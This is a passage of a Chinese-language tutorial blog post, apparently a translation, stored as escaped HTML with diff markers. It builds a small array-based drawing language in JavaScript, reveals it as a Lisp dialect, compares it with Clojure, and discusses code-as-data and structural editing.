+}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不错，我们将对象改成一个数组。然后为了处理这个还需要调整规则：指令的第一部分是函数名称，剩下的就都是参数。
+现在我们 onMessage 可能看起来像：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;websocket.onMessage(data =&amp;gt; {
+  const fns = {
+    drawLine: drawLine,
+    ...
+  };
+  data.instructions.forEach(([fName, ...args]) =&amp;gt; fns[fName](...args));
+})&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;嘣，我们的 drawLine 又能用了！&lt;/p&gt;&lt;h2 id=&quot;更多力量&quot;&gt;更多力量&lt;/h2&gt;&lt;p&gt;到目前为止我们用了 drawLine ：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue')
+// 相当于
+[&amp;quot;drawLine&amp;quot;, { x: 0, y: 0 }, { x: 1, y: 1 }]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但我们如果想表达更有力的东西：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;rotate(drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue'), 90)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看看这个，我们可以把这条指令转换成这样：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;rotate&amp;quot;, [&amp;quot;drawLine&amp;quot;, { x: 0, y: 0 }, { x: 1, y: 1 }], 90]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里， rotate 指令的一个参数可以是指令！很强大，而且我们只需要稍微调整下我们的代码就能让它运行：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;websocket.onMessage(data =&amp;gt; {
+  const fns = {
+    drawLine: drawLine,
+    ...
+  };
+  const parseInstruction = (ins) =&amp;gt; {
+    if (!Array.isArray(ins)) {
+      // 这里是原始的参数例如： {x: 0, y: 0}
+      return ins;
+    }
+    const [fName, ...args] = ins;
+    return fns[fName](...args.map(parseInstruction));
+  };
+  data.instructions.forEach(parseInstruction);
+})&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;很好，我们引入了一个 &lt;code&gt;parseInstruction&lt;/code&gt; 函数。我们可以用 &lt;code&gt;parseInstruction&lt;/code&gt; 递归处理参数，比如这样：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;rotate&amp;quot;, [&amp;quot;rotate&amp;quot;, [&amp;quot;drawLine&amp;quot;, { x: 0, y: 0 }, { x: 1, y: 1 }], 90], 30]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;非常酷！&lt;/p&gt;&lt;h2 id=&quot;进一步简化&quot;&gt;进一步简化&lt;/h2&gt;&lt;p&gt;好，再看看我们的 JSON ：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;{
+  instructions: [[&amp;quot;drawLine&amp;quot;, { x: 0, y: 0 }, { x: 1, y: 1 }]],
+}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们的数据只包含了 instructions ，但我们真得需要一个 &lt;code&gt;instructions&lt;/code&gt; 的键吗？&lt;/p&gt;&lt;p&gt;如果我们写成这样：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;do&amp;quot;, [&amp;quot;drawLine&amp;quot;, { x: 0, y: 0 }, { x: 1, y: 1 }]]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;与其用一个顶层的键我们现在可以用一个叫 &lt;code&gt;do&lt;/code&gt; 的特别指令来执行给出的指令。&lt;/p&gt;&lt;p&gt;以下是一种实现方式：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;websocket.onMessage(data =&amp;gt; {
+  const fns = {
+    ...
+    do: (...args) =&amp;gt; args[args.length - 1],
+  };
+  const parseInstruction = (ins) =&amp;gt; {
+    if (!Array.isArray(ins)) {
+      // 这里是原始的参数例如： {x: 0, y: 0}
+      return ins;
+    }
+    const [fName, ...args] = ins;
+    return fns[fName](...args.map(parseInstruction));
+  };
+  parseInstruction(instruction);
+})&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;哦哇，真简单。我们只是为 &lt;code&gt;fns&lt;/code&gt; 添加了 &lt;code&gt;do&lt;/code&gt; 的定义，现在就能支持像这样的指令了：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[
+  &amp;quot;do&amp;quot;,
+  [&amp;quot;drawPoint&amp;quot;, { x: 0, y: 0 }],
+  [&amp;quot;rotate&amp;quot;, [&amp;quot;drawLine&amp;quot;, { x: 0, y: 0 }, { x: 1, y: 1 }], 90]],
+];&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;更强大的力量&quot;&gt;更强大的力量&lt;/h2&gt;&lt;p&gt;让我们让它更有趣点，如果我们想要支持定义呢？&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const shape = drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')
+rotate(shape, 90)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果我们能够实现定义，远程用户就能写出非常有表现力的指令！让我们把代码转换成我们之前一直在用的数据形式：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;def&amp;quot;, &amp;quot;shape&amp;quot;, [&amp;quot;drawLine&amp;quot;, { x: 0, y: 0 }, { x: 1, y: 1 }]]
+[&amp;quot;rotate&amp;quot;, &amp;quot;shape&amp;quot;, 90]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不错！如果真能支持这样的指令就好了，现在：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;websocket.onMessage(data =&amp;gt; {
+  const variables = {};
+  const fns = {
+    ...
+    def: (name, v) =&amp;gt; {
+      variables[name] = v;
+    },
+  };
+  const parseInstruction = (ins) =&amp;gt; {
+    if (variables[ins]) {
+      // 这里对应着变量例如 &amp;quot;shape&amp;quot;
+      return variables[ins];
+    }
+    if (!Array.isArray(ins)) {
+      // 这里是原始的参数例如： {x: 0, y: 0}
+      return ins;
+    }
+    const [fName, ...args] = ins;
+    return fns[fName](...args.map(parseInstruction));
+  };
+  parseInstruction(instruction);
+})&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这儿我们引入了一个 &lt;code&gt;variables&lt;/code&gt; 对象来跟踪每个我们定义的变量。一个叫 &lt;code&gt;def&lt;/code&gt; 的函数会更新这个 &lt;code&gt;variables&lt;/code&gt; 变量。
+现在我们可以运行像这样的指令：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[
+  &amp;quot;do&amp;quot;,
+  [&amp;quot;def&amp;quot;, &amp;quot;shape&amp;quot;, [&amp;quot;drawLine&amp;quot;, { x: 0, y: 0 }, { x: 1, y: 1 }]],
+  [&amp;quot;rotate&amp;quot;, &amp;quot;shape&amp;quot;, 90],
+];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不错！&lt;/p&gt;&lt;h2 id=&quot;推向极限：目标&quot;&gt;推向极限：目标&lt;/h2&gt;&lt;p&gt;让我们更进一步，如果我们想让远程用户定义自己的函数呢？&lt;/p&gt;&lt;p&gt;他们可能会写类似这样的东西：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const drawTriangle = function(left, top, right, color) {
+   drawLine(left, top, color);
+   drawLine(top, right, color);
+   drawLine(left, right, color);
+}
+drawTriangle(...)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们要怎么做？让我们再次跟随直觉，将这些转换成我们的数据结构，看起来类似这样：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;def&amp;quot;, &amp;quot;drawTriangle&amp;quot;,
+  [&amp;quot;fn&amp;quot;, [&amp;quot;left&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+    [&amp;quot;do&amp;quot;,
+      [&amp;quot;drawLine&amp;quot;, &amp;quot;left&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;color&amp;quot;],
+      [&amp;quot;drawLine&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+      [&amp;quot;drawLine&amp;quot;, &amp;quot;left&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+    ],
+  ],
+],
+[&amp;quot;drawTriangle&amp;quot;, { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, &amp;quot;blue&amp;quot;],&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const drawTriangle = ...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;会转成&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;def&amp;quot;, &amp;quot;drawTriangle&amp;quot;, …]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而且&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;function(left, top, right, color) {…}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;会转成&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;fn&amp;quot;, [&amp;quot;left&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+[&amp;quot;do&amp;quot; ...]]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们需要以某种方式解析这些指令，然后，嘣，我们就能大功告成了！&lt;/p&gt;&lt;h2 id=&quot;推向极限：关键&quot;&gt;推向极限：关键&lt;/h2&gt;&lt;p&gt;实现上面关键在于 &lt;code&gt;[&amp;quot;fn&amp;quot;, …]&lt;/code&gt; 指令，如果我们这样做：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const parseFnInstruction = (args, body, oldVariables) =&amp;gt; {
+  return (...values) =&amp;gt; {
+    const newVariables = {
+      ...oldVariables,
+      ...mapArgsWithValues(args, values),
+    };
+    return parseInstruction(body, newVariables);
+  };
+};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当我们找到 &lt;code&gt;fn&lt;/code&gt; 指令时，我们会运行 &lt;code&gt;parseFnInstruction&lt;/code&gt; 。这会产生一个新的 javascript 函数，
+并将 &lt;code&gt;drawTriangle&lt;/code&gt; 替换成这样：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;drawTriangle&amp;quot;, { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, &amp;quot;blue&amp;quot;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当函数运行时 &lt;code&gt;values&lt;/code&gt; 将变成：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[{ x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, &amp;quot;blue&amp;quot;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const newVariables = {...oldVariables, ...mapArgsWithValues(args, values)}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;会创建一个新的 &lt;code&gt;variables&lt;/code&gt; 对象，包含函数参数和最新的映射值：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const newVariables = {
+  ...oldVariables,
+  left: { x: 0, y: 0 },
+  top: { x: 3, y: 3 },
+  right: {x: 6, y: 0 },
+  color: &amp;quot;blue&amp;quot;,
+}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后，我们可以去获取函数体，在这是：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;      [
+        &amp;quot;do&amp;quot;,
+        [&amp;quot;drawLine&amp;quot;, &amp;quot;left&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;color&amp;quot;],
+        [&amp;quot;drawLine&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+        [&amp;quot;drawLine&amp;quot;, &amp;quot;left&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+      ],&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样 &lt;code&gt;parseInstruction&lt;/code&gt; 在运行时就可以在 &lt;code&gt;newVariables&lt;/code&gt; 里将 &amp;quot;left&amp;quot; 视作变量并获取到值 &lt;code&gt;{x: 0, y: 0}&lt;/code&gt; 。&lt;/p&gt;&lt;p&gt;如果我们做到了，函数功能的主要部分就完成了！&lt;/p&gt;&lt;h2 id=&quot;推向极限：执行&quot;&gt;推向极限：执行&lt;/h2&gt;&lt;p&gt;让我们回想一下计划，首先要做的事是得让 &lt;code&gt;parseInstruction&lt;/code&gt; 接收 &lt;code&gt;variables&lt;/code&gt; 作为一个参数。为此我们得
+先更新 &lt;code&gt;parseInstruction&lt;/code&gt; ：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;  const parseInstruction = (ins, variables) =&amp;gt; {
+    ...
+    return fn(...args.map((arg) =&amp;gt; parseInstruction(arg, variables)));
+  };
+  parseInstruction(instruction, variables);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来我们去检测这个 &amp;quot;fn&amp;quot; 指令：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;  const parseInstruction = (ins, variables) =&amp;gt; {
+    ...
+    const [fName, ...args] = ins;
+    if (fName == &amp;quot;fn&amp;quot;) {
+      return parseFnInstruction(...args, variables);
+    }
+    ...
+    return fn(...args.map((arg) =&amp;gt; parseInstruction(arg, variables)));
+  };
+  parseInstruction(instruction, variables);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;现在，我们的 &lt;code&gt;parseFnInstruction&lt;/code&gt; ：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const mapArgsWithValues = (args, values) =&amp;gt; {
+  return args.reduce((res, k, idx) =&amp;gt; {
+    res[k] = values[idx];
+    return res;
+  }, {});
+}
+const parseFnInstruction = (args, body, oldVariables) =&amp;gt; {
+  return (...values) =&amp;gt; {
+    const newVariables = {...oldVariables, ...mapArgsWithValues(args, values)}
+    return parseInstruction(body, newVariables);
+  };
+};&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;就完全按照我们想的一样，当运行时返回一个新的函数：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;创建一个新的 &lt;code&gt;newVariables&lt;/code&gt; 对象，将 &lt;code&gt;args&lt;/code&gt; 和 &lt;code&gt;values&lt;/code&gt; 关联。&lt;/li&gt;&lt;li&gt;将 &lt;code&gt;body&lt;/code&gt; 和新的 &lt;code&gt;variables&lt;/code&gt; 传入 &lt;code&gt;parseInstruction&lt;/code&gt; 运行。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;好的，差不多了。还差最后一点让一切跑起来：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;  const parseInstruction = (ins, variables) =&amp;gt; {
+    ...
+    const [fName, ...args] = ins;
+    if (fName == &amp;quot;fn&amp;quot;) {
+      return parseFnInstruction(...args, variables);
+    }
+    const fn = fns[fName] || variables[fName];
+    return fn(...args.map((arg) =&amp;gt; parseInstruction(arg, variables)));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;秘密在于：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;    const fn = fns[fName] || variables[fName];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里由于 &lt;code&gt;fn&lt;/code&gt; 现在可以同时来源于 &lt;code&gt;fns&lt;/code&gt; 和 &lt;code&gt;variables&lt;/code&gt; ，让我们同时支持两者，然后能用了！&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;websocket.onMessage(data =&amp;gt; {
+  const variables = {};
+  const fns = {
+    drawLine: drawLine,
+    drawPoint: drawPoint,
+    rotate: rotate,
+    do: (...args) =&amp;gt; args[args.length - 1],
+    def: (name, v) =&amp;gt; {
+      variables[name] = v;
+    },
+  };
+  const mapArgsWithValues = (args, values) =&amp;gt; {
+    return args.reduce((res, k, idx) =&amp;gt; {
+      res[k] = values[idx];
+      return res;
+    }, {});
+  };
+  const parseFnInstruction = (args, body, oldVariables) =&amp;gt; {
+    return (...values) =&amp;gt; {
+      const newVariables = {
+        ...oldVariables,
+        ...mapArgsWithValues(args, values),
+      };
+      return parseInstruction(body, newVariables);
+    };
+  };
+  const parseInstruction = (ins, variables) =&amp;gt; {
+    if (variables[ins]) {
+      // 这里就对应着变量例如 &amp;quot;shape&amp;quot;
+      return variables[ins];
+    }
+    if (!Array.isArray(ins)) {
+      // 这里是原始的参数例如： {x: 0, y: 0}
+      return ins;
+    }
+    const [fName, ...args] = ins;
+    if (fName == &amp;quot;fn&amp;quot;) {
+      return parseFnInstruction(...args, variables);
+    }
+    const fn = fns[fName] || variables[fName];
+    return fn(...args.map((arg) =&amp;gt; parseInstruction(arg, variables)));
+  };
+  parseInstruction(instruction, variables);
+})&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;天啊，就凭这些代码我们就能解析这些：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[
+  &amp;quot;do&amp;quot;,
+  [
+    &amp;quot;def&amp;quot;,
+    &amp;quot;drawTriangle&amp;quot;,
+    [
+      &amp;quot;fn&amp;quot;,
+      [&amp;quot;left&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+      [
+        &amp;quot;do&amp;quot;,
+        [&amp;quot;drawLine&amp;quot;, &amp;quot;left&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;color&amp;quot;],
+        [&amp;quot;drawLine&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+        [&amp;quot;drawLine&amp;quot;, &amp;quot;left&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+      ],
+    ],
+  ],
+  [&amp;quot;drawTriangle&amp;quot;, { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, &amp;quot;blue&amp;quot;],
+  [&amp;quot;drawTriangle&amp;quot;, { x: 6, y: 6 }, { x: 10, y: 10 }, { x: 6, y: 16 }, &amp;quot;purple&amp;quot;],
+])&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们可以组合函数、定义变量甚至创建自己的函数。仔细想想，我们刚刚相当于创建了一门新的编程语言！ &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;h2 id=&quot;试试看&quot;&gt;试试看&lt;/h2&gt;&lt;p&gt;这是一个绘制三角形的例子 🙂&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://jsfiddle.net/xn3tkdhL/3/&quot; class=&quot;external_link&quot;&gt;Edit fiddle - JSFiddle - Code Playground&lt;/a&gt;&lt;/p&gt;&lt;p&gt;和一个快乐的小人的例子&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://jsfiddle.net/xn3tkdhL/2/&quot; class=&quot;external_link&quot;&gt;Edit fiddle - JSFiddle - Code Playground&lt;/a&gt;&lt;/p&gt;&lt;h2 id=&quot;惊喜&quot;&gt;惊喜&lt;/h2&gt;&lt;p&gt;我们甚至还能发现一些有趣的东西，我们新的编程语言比起 Javascript 还有一些优点！&lt;/p&gt;&lt;h3 id=&quot;没什么特别的&quot;&gt;没什么特别的&lt;/h3&gt;&lt;p&gt;在 Javascript 中，你通过写下 const x = foo 来定义变量，如果你想重写 &lt;code&gt;const&lt;/code&gt; 例如写成 &lt;code&gt;c&lt;/code&gt; 是办不到的，
+因为 const x = foo 是一个 Javascript 中的特殊语法，你无法改变它。&lt;/p&gt;&lt;p&gt;但在我们的数组语言里，根本没什么语法！一切都只是数组。我们可以轻易写出特殊的类似 &lt;code&gt;def&lt;/code&gt; 一样的 &lt;code&gt;c&lt;/code&gt; 指令。&lt;/p&gt;&lt;p&gt;仔细想想看，在 Javascript 中我们类似于客人，我们得遵循语言设计者的规则。但在我们的数组语言里，我们是「共同所有者」，
+语言设计者的「内置」内容（例如 &amp;quot;def&amp;quot; &amp;quot;fn&amp;quot;）和我们写下的（例如 &amp;quot;drawTriangle&amp;quot;）没什么太大区别！&lt;/p&gt;&lt;h3 id=&quot;数据即代码&quot;&gt;数据即代码&lt;/h3&gt;&lt;p&gt;还有一个更大的优点。我们的代码只是一大堆数组，所以我们能对这些代码做点事情，我们可以写生成代码的代码！&lt;/p&gt;&lt;p&gt;例如，如果我们想在 Javascript 里支持 &lt;code&gt;unless&lt;/code&gt; ：&lt;/p&gt;&lt;p&gt;当有人写下&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;unless foo {
+   ...
+}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们要将其重写成&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;if !foo {
+   ...
+}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这很难做到，可能需要类似 Babel 这类的工具解析文件确保能在 AST 之上将代码安全地重写成&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;if !foo {
+  ...
+}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但在我们的数组语言里，代码就是数组！很容易将其重写成 &lt;code&gt;unless&lt;/code&gt; ：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;function rewriteUnless(unlessCode) {
+   const [_unlessInstructionName, testCondition, consequent] = unlessCode; 
+   return [&amp;quot;if&amp;quot;, [&amp;quot;not&amp;quot;, testCondition], consequent]
+}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;rewriteUnless([&amp;quot;unless&amp;quot;, [&amp;quot;=&amp;quot;, 1, 1], [&amp;quot;drawLine&amp;quot;]])
+// =&amp;gt;
+[&amp;quot;if&amp;quot;, [&amp;quot;not&amp;quot;, [&amp;quot;=&amp;quot;, 1, 1]], [&amp;quot;drawLine&amp;quot;]];&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;天哪，小菜一碟。&lt;/p&gt;&lt;h2 id=&quot;结构编辑&quot;&gt;结构编辑&lt;/h2&gt;&lt;p&gt;用数据表示你的代码不仅让你容易操作你的代码也同时让你能够轻松编辑。例如
+假设现在你在编辑这段代码：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;if&amp;quot;, testCondition, consequent]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;你想把 &lt;code&gt;testCondition&lt;/code&gt; 换成 &lt;code&gt;[&amp;quot;not&amp;quot;, testCondition]&lt;/code&gt;&lt;/p&gt;&lt;p&gt;你可以把光标移动到 &lt;code&gt;testCondition&lt;/code&gt;&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;if&amp;quot;, |testCondition, consequent]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后创建一个数组&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;if&amp;quot;, [|] testCondition, consequent]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后键入 &amp;quot;not&amp;quot;&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;if&amp;quot;, [&amp;quot;not&amp;quot;, |] testCondition, consequent]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果你在用的编辑器理解这些数组，你可以告诉它：「拓展」这个数组到右边：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;if&amp;quot;, [&amp;quot;not&amp;quot;, testCondition], consequent]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;嘣，你的编辑器就帮你修改了代码结构。&lt;/p&gt;&lt;p&gt;如果你想撤销这个操作，你可以把光标移动到 &lt;code&gt;testCondition&lt;/code&gt; 旁&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;if&amp;quot;, [&amp;quot;not&amp;quot;, |testCondition], consequent]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;并请编辑器「提升」一个层级：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[&amp;quot;if&amp;quot;, testCondition, consequent]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;突然间，与其说是在编辑字符不说说是在操作代码结构。这就叫做结构编辑 &lt;sup&gt;&lt;a href=&quot;#2&quot; id=&quot;2r&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; 。这让你拥有陶艺家般的速度，这也是将代码
+当作数据的众多好处之一。&lt;/p&gt;&lt;h2 id=&quot;你发现了什么&quot;&gt;你发现了什么&lt;/h2&gt;&lt;p&gt;嗯，我们写出的数组语言……只是一个实现不佳的 Lisp 方言！&lt;/p&gt;&lt;p&gt;我们这个最复杂的例子：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[
+  &amp;quot;do&amp;quot;,
+  [
+    &amp;quot;def&amp;quot;,
+    &amp;quot;drawTriangle&amp;quot;,
+    [
+      &amp;quot;fn&amp;quot;,
+      [&amp;quot;left&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+      [
+        &amp;quot;do&amp;quot;,
+        [&amp;quot;drawLine&amp;quot;, &amp;quot;left&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;color&amp;quot;],
+        [&amp;quot;drawLine&amp;quot;, &amp;quot;top&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+        [&amp;quot;drawLine&amp;quot;, &amp;quot;left&amp;quot;, &amp;quot;right&amp;quot;, &amp;quot;color&amp;quot;],
+      ],
+    ],
+  ],
+  [&amp;quot;drawTriangle&amp;quot;, { x: 0, y: 0 }, { x: 3, y: 3 }, { x: 6, y: 0 }, &amp;quot;blue&amp;quot;],
+  [&amp;quot;drawTriangle&amp;quot;, { x: 6, y: 6 }, { x: 10, y: 10 }, { x: 6, y: 16 }, &amp;quot;purple&amp;quot;],
+])&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用 Clojure （另一种 lisp 方言）写出来是这样的：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-clojure&quot;&gt;(do
+  (def draw-triangle (fn [left top right color]
+                       (draw-line left top color)
+                       (draw-line top right color)
+                       (draw-line left right color)))
+  (draw-triangle {:x 0 :y 0} {:x 3 :y 3} {:x 6 :y 0} &amp;quot;blue&amp;quot;)
+  (draw-triangle {:x 6 :y 6} {:x 10 :y 10} {:x 6 :y 16} &amp;quot;purple&amp;quot;))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;表面上的区别在于：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;用 &lt;code&gt;()&lt;/code&gt; 代替列表&lt;/li&gt;&lt;li&gt;移除了所有逗号&lt;/li&gt;&lt;li&gt;驼峰命名变成了短横线命名&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;剩下的规则就差不多了：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-clojure&quot;&gt;(draw-line left top color)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;意味者：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;对 &lt;code&gt;left&lt;/code&gt;, &lt;code&gt;top&lt;/code&gt;, &lt;code&gt;color&lt;/code&gt; 求值，并用求出来的值替换它本身&lt;/li&gt;&lt;li&gt;将这些值带入到 &lt;code&gt;draw-line&lt;/code&gt; 这个函数并执行&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;发现？&quot;&gt;发现？&lt;/h2&gt;&lt;p&gt;现在如果我们认同操作源代码对我们很重要，那什么语言更方便让我们操作呢？&lt;/p&gt;&lt;p&gt;换个说法说：如何让我们的代码像代码里的数据一样直观？一个想法很快就会浮现：让代码既是数据！
+多么激动的结论。如果我们关心操作源代码，那么一个自然而言的答案就是：代码既数据 &lt;sup&gt;&lt;a href=&quot;#3&quot; id=&quot;3r&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; 。&lt;/p&gt;&lt;p&gt;如果代码即数据，那么我们可以用什么样的数据来表现？XML 可以，JSON 也可以，但如果我们往下找到最简单的数据结构
+会发生什么？这会导向最简单的嵌套结构……列表！&lt;/p&gt;&lt;p&gt;这让人发人深省又激动人心。&lt;/p&gt;&lt;p&gt;发人深省在于，感觉 Lisp 像是被「发现」的。像是什么最优化问题的解一样：如果你关心操作代码，
+你就会像发现万有引力一样发现 Lisp 。用一种发现出来的工具有点令人心生敬畏：或许某些天外生命就在用着 Lisp ！&lt;/p&gt;&lt;p&gt;激动人心在于，可能有更好的语法在这，谁知道呢。Ruby 和 Python 是某种实验，尝试在没有括号的情况下带来类似 Lisp 般的力量。我
